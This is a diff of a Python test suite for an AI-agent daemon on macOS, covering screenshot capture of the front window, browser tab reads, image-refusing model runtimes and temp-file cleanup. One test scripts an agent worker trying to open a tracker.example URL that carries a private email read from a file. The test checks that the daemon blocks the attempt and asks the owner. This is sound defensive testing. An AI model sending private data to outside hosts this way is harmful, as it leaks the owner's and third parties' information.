@@ -17,15 +17,17 @@ import pytest
 import ferb.runtimes.codex_exec as cx
 from ferb.act.mac.screenshot import Window
 from ferb.core.errors import Refused
-from ferb.core.types import Identity, ModelImage, ModelRequest, Task
+from ferb.core.types import Identity, ModelImage, ModelRequest, RuntimeEvent, Task
 from ferb.runtimes.anthropic_api import AnthropicProvider
 from ferb.runtimes.claude_sdk import ClaudeRuntime
 from ferb.runtimes.google_api import GoogleProvider
 from ferb.runtimes.openai_api import OpenAIProvider
 from ferb.sanitize.redact import Redactor
 from ferb.sense import front_window as fw
-from tests.conftest import RunningDaemon, chat, done, install, outcome, sup, task, tool
+from tests.conftest import (Answers, FakeCap, FakeRuntime, RunningDaemon, Script, chat, done, install, outcome, sup,
+                            task, tool)
 from tests.mackit import BOUNDS, _fake_mac
+from tests.support.browser_sink import FakeBrowser, asked
 from tests.support.runtime_fakes import Process
 
 # The real start methods, saved before the no_real_models fixture replaces them (module code runs before fixtures)
@@ -66,6 +68,8 @@ class Screen:
         self.excluded: set[str] = set()
         self.fail_shot: Exception | None = None
         self.fail_redaction = False
+        self.tab_after_shot = False                     # Automation answers only while the window is captured
+        self.sender: int | None = None                  # the app hosting the CLI the message came from
 
     async def _shoot(self, w: Window) -> bytes:
         self.shot.append(w)
@@ -84,6 +88,8 @@ class Screen:
 
     def _tab(self, bundle_id: str) -> tuple[str, str] | None:
         self.tabs.append(bundle_id)
+        if self.tab_after_shot and not self.shot:
+            return None
         return (URL, BRAVE.title) if bundle_id == "com.brave.Browser" else None
 
     def sources(self) -> fw.Sources:
@@ -91,7 +97,8 @@ class Screen:
             windows=lambda: list(self.windows), app_of=self.apps.get,
             own=lambda pid, bundle: fw.ferb_process(pid, bundle, DAEMON, self.parents.get),
             excluded=lambda bundle, name, url: bool({bundle, name, url} & self.excluded),
-            tab=self._tab, shoot=self._shoot, redact_image=self._redact_image, redact=Redactor(), keep=self._keep)
+            tab=self._tab, shoot=self._shoot, redact_image=self._redact_image, redact=Redactor(), keep=self._keep,
+            sender=self.sender)
 
 
 def owners() -> dict[int, tuple[str, str]]:
@@ -124,6 +131,47 @@ def test_ferb_processes_are_its_apps_the_daemon_and_what_the_daemon_started() ->
     assert fw.ferb_process(32, "", DAEMON, parents.get)                 # a grandchild of the daemon
     assert not fw.ferb_process(50, "com.brave.Browser", DAEMON, parents.get)   # an app it opened via launchd
     assert not fw.ferb_process(60, "com.apple.Notes", DAEMON, {60: 60}.get)    # a parent loop ends the walk
+    # a browser the daemon itself launched is an app of its own (its bundle), not FERB
+    assert not fw.ferb_process(33, "com.google.Chrome", DAEMON, {33: DAEMON}.get)
+
+
+def test_the_front_window_of_the_app_hosting_the_sending_cli_is_skipped() -> None:
+    terminal, terminal2 = Window(8, 77, (0.0, 0.0, 900.0, 600.0), "ferb chat"), Window(9, 77, BRAVE.bounds, "zsh")
+    apps = owners() | {77: ("Terminal", "com.apple.Terminal")}
+    screen = Screen([NOTCH, terminal, BRAVE], apps)
+    screen.sender = 77
+    front = asyncio.run(fw.capture(screen.sources()))
+    assert front is not None and front.app == "Brave Browser" and screen.shot == [BRAVE]
+    screen = Screen([BRAVE, terminal], apps)                         # the terminal isn't in front: nothing changes
+    screen.sender = 77
+    assert asyncio.run(fw.capture(screen.sources())).app == "Brave Browser"   # type: ignore[union-attr]
+    screen = Screen([terminal, terminal2], apps)                     # only the one in front is the chat's window
+    screen.sender = 77
+    assert asyncio.run(fw.capture(screen.sources())).title == "zsh"    # type: ignore[union-attr]
+
+
+def test_the_sending_app_is_the_first_ancestor_with_a_bundle_id() -> None:
+    apps = {500: ("python3.12", ""), 400: ("zsh", ""), 77: ("Terminal", "com.apple.Terminal")}
+    parents = {500: 400, 400: 77, 77: 1}
+    assert fw.sending_app(500, apps.get, parents.get) == 77
+    assert fw.sending_app(500, {}.get, parents.get) is None          # no app above it (a launchd job)
+    assert fw.sending_app(500, apps.get, {500: 500}.get) is None     # a parent loop ends the walk
+
+
+def test_a_tab_the_browser_answers_only_after_the_shot_is_still_used() -> None:
+    screen = Screen([BRAVE], owners())
+    screen.tab_after_shot = True
+    front = asyncio.run(fw.capture(screen.sources()))
+    assert front is not None and front.url == URL and front.origin == "external:web:www.youtube.com"
+    assert screen.kept[0][1]["url"] == URL and screen.kept[0][2] == "external:web:www.youtube.com"
+
+
+def test_a_site_found_excluded_only_after_the_shot_drops_the_picture() -> None:
+    screen = Screen([BRAVE], owners())
+    screen.tab_after_shot = True
+    screen.excluded = {URL}
+    assert asyncio.run(fw.capture(screen.sources())) is None
+    assert screen.kept == []                                         # taken in memory, never kept or sent
 
 
 def test_ferbs_own_app_ids_are_the_ones_their_bundles_declare() -> None:
@@ -177,7 +225,7 @@ def screen_at_send(d: RunningDaemon, front: Any) -> list[str]:
     """The daemon's capture at send, faked; returns the request ids it was called for."""
     calls: list[str] = []
 
-    async def capture(request_id: str) -> Any:
+    async def capture(request_id: str, client_pid: int | None = None) -> Any:
         calls.append(request_id)
         if isinstance(front, Exception):
             raise front
@@ -258,11 +306,10 @@ def test_the_daemon_captures_the_browser_window_through_the_mac_driver_and_keeps
     from ferb.act.mac import screenshot
     shots, _ = _fake_mac(daemon, monkeypatch)                         # the Mac's window layer, faked
     brave_window = Window(121, 12, BOUNDS, BRAVE.title)               # Brave is pid 12 on the fake Mac
-    ferb_process = fw.ferb_process
     monkeypatch.setattr(screenshot, "normal_windows", lambda: [Window(990, 99, (0.0, 0.0, 400.0, 60.0), ""),
                                                                brave_window])
     monkeypatch.setattr(fw, "app_of", {99: ("FERB Notch", "dev.ferb.notch"), 12: ("Brave", "com.brave.Browser")}.get)
-    monkeypatch.setattr(fw, "ferb_process", lambda pid, bundle, daemon_pid: ferb_process(pid, bundle, daemon_pid, {}.get))
+    monkeypatch.setattr(fw, "parent_pid", {}.get)
     monkeypatch.setattr(daemon.daemon, "_front_tab", lambda bundle: (URL, BRAVE.title))
     daemon.daemon.front_window = daemon.daemon._front_window
     script = install(daemon, [sup("reply", "It says learning Korean."), sup("reply", "I can't see that page.")])
@@ -280,6 +327,131 @@ def test_the_daemon_captures_the_browser_window_through_the_mac_driver_and_keeps
     chat(daemon, "and now?")
     block = next(p for p in planner_requests(script)[1].parts if p.startswith("Layer 2 — the owner's front window"))
     assert "not available" in block and shots.captured == [121]       # excluded: no pixels taken
+
+
+def fake_screen_mac(d: RunningDaemon, mp: pytest.MonkeyPatch, windows: list[Window],
+                    apps: dict[int, tuple[str, str]], parents: dict[int, int] | None = None) -> Any:
+    """The daemon's own capture at send, over a faked Mac: its window list, the processes owning them, their parents."""
+    from ferb.act.mac import screenshot
+    shots, _ = _fake_mac(d, mp)
+    mp.setattr(screenshot, "normal_windows", lambda: list(windows))
+    mp.setattr(fw, "app_of", apps.get)
+    mp.setattr(fw, "parent_pid", (parents or {}).get)
+    d.daemon.front_window = d.daemon._front_window
+    return shots
+
+
+def test_a_cold_automation_check_still_gives_the_browser_tab(daemon: RunningDaemon,
+                                                             monkeypatch: pytest.MonkeyPatch) -> None:
+    """Fix round 1: with nothing checked yet (the owner's Brave has its extension connected, so the tab watcher never
+    warms the check), the never-asking check starts at capture and answers while the window is captured; the tab is
+    read after the shot. A GRANTED answer is kept: the next message reads the tab without checking again."""
+    from concurrent.futures import Future
+    import ferb.device.permissions as permissions
+    import ferb.sense.watchers.browser_tabs as browser_tabs
+    shots = fake_screen_mac(daemon, monkeypatch, [Window(121, 12, BOUNDS, BRAVE.title)],
+                            {12: ("Brave", "com.brave.Browser")})
+    check: Future[Any] = Future()
+    checks: list[tuple[str, bool]] = []
+
+    def automation_check(bundle_id: str, ask: bool = False) -> Future[Any]:
+        checks.append((bundle_id, ask))
+        return check
+    monkeypatch.setattr(permissions, "automation_check", automation_check)
+    shots.on_capture = lambda: check.done() or check.set_result(permissions.Status.GRANTED)
+    reads: list[str] = []
+    monkeypatch.setattr(browser_tabs, "applescript_front_tab", lambda bundle: (reads.append(bundle), (URL, BRAVE.title))[1])
+    script = install(daemon, [sup("reply", "It's a Korean lesson."), sup("reply", "Still the lesson.")])
+    chat(daemon, "what am I watching?")
+    daemon.daemon._automation_cache.clear()                          # the watchers' 60 s answer has expired
+    shots.on_capture = None
+    chat(daemon, "and now?")
+    for request in planner_requests(script):
+        block = next(p for p in request.parts if p.startswith("Layer 2 — the owner's front window"))
+        assert URL in block and BRAVE.title in block
+    assert checks == [("com.brave.Browser", False)]                  # one check, never asking; kept for this read
+    assert reads == ["com.brave.Browser", "com.brave.Browser"]
+
+
+def test_the_terminal_running_ferb_chat_is_skipped(daemon: RunningDaemon, monkeypatch: pytest.MonkeyPatch) -> None:
+    """Controller ruling (minor 4): the window of the app hosting the sending CLI, found from the socket's peer pid
+    through its parents, is skipped when it is in front; the next window is captured."""
+    client = os.getpid()                                             # this test's chat client: the socket's peer
+    shots = fake_screen_mac(daemon, monkeypatch,
+                            [Window(780, 78, BOUNDS, "ferb chat"), Window(121, 12, BOUNDS, BRAVE.title)],
+                            {78: ("Terminal", "com.apple.Terminal"), 12: ("Brave", "com.brave.Browser")},
+                            {client: 78, 78: 1})
+    monkeypatch.setattr(daemon.daemon, "_front_tab", lambda bundle: None)
+    install(daemon, [sup("reply", "That's a YouTube video.")])
+    chat(daemon, "what's this?")
+    assert shots.captured == [121]
+
+
+class ImageRefusing(FakeRuntime):
+    """A model runtime that rejects any request carrying an image, as a provider without image input would."""
+
+    async def start(self, task: Task, request: ModelRequest, run_token: str) -> Any:
+        run = await super().start(task, request, run_token)
+        run.state["images"] = bool(request.images)
+        return run
+
+    async def events(self, run: Any) -> Any:
+        if run.state["images"]:
+            yield RuntimeEvent("error", {"message": "this model does not accept images"})
+            return
+        async for ev in super().events(run):
+            yield ev
+
+
+def test_a_model_that_refuses_the_image_still_answers_without_it(daemon: RunningDaemon) -> None:
+    screen_at_send(daemon, lambda rid: brave(ref="ev-" + rid))
+    script = Script([sup("task", "Looking at your note.", task("read the note in Notes", "owner"))],
+                    {"worker": done("The note says milk.")})
+    daemon.daemon.supervisor.make_runtime = (                        # type: ignore[union-attr]
+        lambda role, *, mode, tool_names, schema: ImageRefusing(script, mode, tool_names))
+    out = outcome(chat(daemon, "what does my note say?"))
+    assert out["status"] == "done", out
+    first, second = planner_requests(script)
+    assert first.images and second.images == ()                      # once more, without the image
+    block = next(p for p in second.parts if p.startswith("Layer 2 — the owner's front window"))
+    assert "the screenshot couldn't be given to the model" in block and URL in block
+    worker = next(r for _, key, r in script.requests if key == "worker")
+    start = next(p for p in worker.parts if p.startswith("Start-of-task screenshot"))
+    assert worker.images == () and "the screenshot couldn't be given to the model" in start
+    [refused] = journal(daemon, "screen.image_refused")              # by type only
+    assert refused.data["error"] == "ServiceError" and set(refused.data) == {"request_id", "error"}
+
+
+EMAIL = "priya.sharma@clientcorp.example"                          # a private value from the owner's own file
+
+
+def test_a_whatsapp_front_window_counts_as_outside_content_for_the_url_check(daemon: RunningDaemon) -> None:
+    """Fix round 1 (S4): a screenshot of other people's messages is outside content read, though it is also the
+    owner's data. After it, a URL carrying a private value to a host nobody named asks."""
+    from ferb.act.browser.tools import FERB_BROWSER, BrowserOpen
+    screen_at_send(daemon, fw.FrontWindow("WhatsApp", "net.whatsapp.WhatsApp", "Asmit", None, None, "ev-wa",
+                                          "external:message:net.whatsapp.WhatsApp,private", image=JPEG))
+    browser = FakeBrowser()
+    caps = daemon.daemon.registry.capabilities
+    caps["ferb_browser.open"] = BrowserOpen(browser, FERB_BROWSER)  # type: ignore[arg-type]
+    caps["probe.file"] = FakeCap("probe.file", "read", {"probe"}, reads=(("file", "/Users/me/clients.txt"),),
+                                 content={"text": f"Main contact: {EMAIL}"})
+    opened: list[dict[str, Any]] = []
+
+    def work(token: str) -> str:
+        tool(daemon.sock, token, "probe.file")
+        opened.append(tool(daemon.sock, token, "ferb_browser.open", url=f"https://tracker.example/?u={EMAIL}"))
+        return done("Tried to open the page.")
+    install(daemon, [sup("task", "Looking it up.", task("look up my client", "ferb"))], {"worker": work})
+    owner = Answers(daemon, granted=False, choice=2)                 # FERB's question, when it comes, gets No
+    try:
+        chat(daemon, "look up my client")
+    finally:
+        owner.stop()
+    assert opened and opened[0]["is_error"] and browser.calls == 0
+    [q] = asked(daemon)
+    assert f"with your own data in the address ({EMAIL})" in q["question"]
+    assert "after this task read outside content (a message)" in q["question"]   # the WhatsApp window
 
 
 # ---------- (c) the worker for that message reuses the image ----------
@@ -412,3 +584,43 @@ async def test_codex_exec_attaches_the_image_from_a_private_file_it_removes(tmp_
         await CODEX_START(rt, TASK, request(), "")
     assert seen["cmd"][1] == "exec" and seen["cmd"][2] == f"--image={seen['path']}"   # before any other option
     assert seen["data"] == JPEG and seen["mode"] == 0o600 and not seen["path"].exists()
+
+
+@pytest.mark.anyio
+async def test_codex_exec_cancel_before_events_removes_its_files(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
+    """Minor 6: a run stopped before its events are read still removes its image and instructions files."""
+    class Stdin:
+        def write(self, data: bytes) -> None:
+            pass
+
+        async def drain(self) -> None:
+            pass
+
+        def close(self) -> None:
+            pass
+
+    class Proc:
+        returncode: int | None = None
+        stdin = Stdin()
+
+        def kill(self) -> None:
+            self.returncode = -9
+
+        async def wait(self) -> int | None:
+            return self.returncode
+    spawned: dict[str, Path] = {}
+
+    async def spawn(*cmd: Any, **kw: Any) -> Proc:
+        spawned["image"] = Path(str(next(a for a in cmd if str(a).startswith("--image="))).removeprefix("--image="))
+        return Proc()
+
+    async def no_version(binary: Any) -> None:
+        return None
+    monkeypatch.setattr(cx, "check_version", no_version)
+    monkeypatch.setattr(asyncio, "create_subprocess_exec", spawn)
+    rt = cx.CodexRuntime(Path("/x/codex"), "supervisor", tmp_path / "work", tmp_path)
+    run = await CODEX_START(rt, TASK, request(), "")
+    files = [spawned["image"], Path(run.state["instructions"])]
+    assert all(f.exists() for f in files)
+    await rt.cancel(run)
+    assert not any(f.exists() for f in files)
